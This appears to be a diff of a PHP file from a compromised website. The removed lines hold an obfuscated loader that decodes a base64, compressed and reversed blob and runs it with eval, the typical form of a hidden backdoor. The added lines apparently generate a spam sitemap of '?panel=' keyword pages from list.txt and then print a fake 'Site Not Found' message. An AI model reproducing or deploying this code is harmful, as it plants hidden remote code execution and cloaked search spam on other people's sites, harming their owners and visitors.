@@ -1,8 +1,44 @@
 <?php
+function getFileRowCount($filename)
+{
+    $file = fopen($filename, "r");
+    $rowCount = 0;
 
-$unknown = "ZXZhbCUyOCUyNyUzRiUyNmd0JTNCJTI3Lmd6dW5jb21wcmVzcyUyOGd6aW5mbGF0ZSUyOGd6aW5mbGF0ZSUyOGJhc2U2NF9kZWNvZGUlMjhzdHJyZXYlMjglMjR1azQ1JTI5JTI5JTI5JTI5JTI5JTI5JTNC";
+    while (!feof($file)) {
+        fgets($file);
+        $rowCount++;
+    }
 
-$uk45 = "==Ace3aUBwf3u7l9IiCqf08TBzyxYCYfxE+gCCuGUC9Im2Cpel7VoA2JB6x1jZbc03ALgZQGQWiSsIEqBP7eKbDd9tVFtvzsTTsU+X/1h+vIredTYFmXWvlRMx6gO+nGH/FrAcbcMf5mio65bJ6Obx3yF4kXceBAaS65g1PmTWFHd3uLlfD+jkNi4SbNNF6uCRJaFvUd3Bcr+T20qHlD+8cg3BOzcAX0D/1BcAy03a8HHiAKh3fAwh9b9h46wwlRyvHZbxhh7Xq3CeVtNpx2SX9K0OfLG38mVOKEs/EtqgSA7Momcco+7AXYmwAm9cwG9aivfdPmy2HLcZMSJCYS7VJ56zX8lKjfRAj9pDsLy6G1wMKZa2R2xaJzr+ouJgEY59beia7GBenrHV2RHMuGij67my4qjmaDesWjuKTTzfx66Ev1/0Wnpri/r4UCiHnc6qSWNHsNxqxMLXhCNCakGX3bjAqImi1tAZr7hvKb3SPrVvT4PRnCV4gBBTleN5kQeiOFqxRDKiq5UnqOUZu9cHTwtvJZiwp7R39OrWhsUW3/rMxqqc9D9dLLclVpTVZq2qrUALb7CkXBec+Qm6iHsF8FfawnTQ2obuDcwlbf/HsH5xVgwdZrVSZLWWnk3qkDvVBXOctJ1cyAQjjU44z+gDKHZkNwvnLzJPv5McuegdZ6C68F2kRrxVjhkxYjlIHtkFwhamoWMXMUp0UWpKTixo0pR/yP7MBv1c9AuoLuksfVKdgTETRmwEpfZbJpdLQsS8OMFoijldtOFBRBCX3E5EZIwHCb4Lge1lfP5Y9KgeJ4VuLTtI39bWpNz8spkBLF4SWRsKpe+lW5t39n98dPu/uJqGJELXlJS62c/afC60ls7IFzpRcmUMtQB0/KlWRpoUQWtOIfk14qLVVYD/fa+0PEwM9bvTVlciX/HJAuB0vQC0bA";
-eval(htmlspecialchars_decode(urldecode(base64_decode($unknown))));
-exit;
+    fclose($file);
+
+    return $rowCount;
+}
+$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
+$fullUrl = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+if (isset($fullUrl)) {
+    $parsedUrl = parse_url($fullUrl);
+    $scheme = isset($parsedUrl['scheme']) ? $parsedUrl['scheme'] : '';
+    $host = isset($parsedUrl['host']) ? $parsedUrl['host'] : '';
+    $path = isset($parsedUrl['path']) ? $parsedUrl['path'] : '';
+    $baseUrl = $scheme . "://" . $host . $path;
+    $urlAsli = str_replace("program.php", "", $baseUrl);
+    $judulFile = "list.txt";
+    $jumlahBaris = getFileRowCount($judulFile);
+    $sitemapFile = fopen("sitemap.xml", "w");
+    fwrite($sitemapFile, '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL);
+    fwrite($sitemapFile, '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL);
+    $fileLines = file($judulFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    foreach ($fileLines as $index => $judul) {
+        $sitemapLink = $urlAsli . '?panel=' . urlencode($judul);
+        fwrite($sitemapFile, '  <url>' . PHP_EOL);
+        fwrite($sitemapFile, '    <loc>' . $sitemapLink . '</loc>' . PHP_EOL);
+        fwrite($sitemapFile, '  </url>' . PHP_EOL);
+    }
+    fwrite($sitemapFile, '</urlset>' . PHP_EOL);
+    fclose($sitemapFile);
+    echo "Site Not Found.";
+} else {
+    echo "URL saat ini tidak didefinisikan.";
+}
+
 ?>
